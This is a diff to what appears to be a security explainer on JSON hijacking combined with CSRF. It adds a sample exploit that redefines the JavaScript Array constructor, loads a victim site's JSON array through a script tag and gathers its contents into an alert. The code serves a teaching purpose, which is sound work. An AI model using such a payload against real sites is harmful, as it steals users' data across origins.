@@ -11,5 +11,25 @@ Combined to a CSRF attack.
 1. Returning a JSON array is valid as the source for a JavaScript `<script>` tag
 1. JavaScript allows us to redefine the Array constructor
 
-TO_DO exploit sample
+Sample Exploit:
+
+``` typescript
+<script type="text/javascript">
+    var secrets;
+    Array = function() {
+        secrets = this;
+    };
+</script>
+
+<script src="http://victim.com/demos/secret-info.json" type="text/javascript"></script>
+
+<script type="text/javascript">
+    var yourData = '';
+    var i = -1;
+    while(secrets[++i]) {
+        yourData += secrets[i] + ' ';
+    }
+    alert('I stole your data, I can exploit it / send it to another server : ' + yourData);
+</script>
+```
 
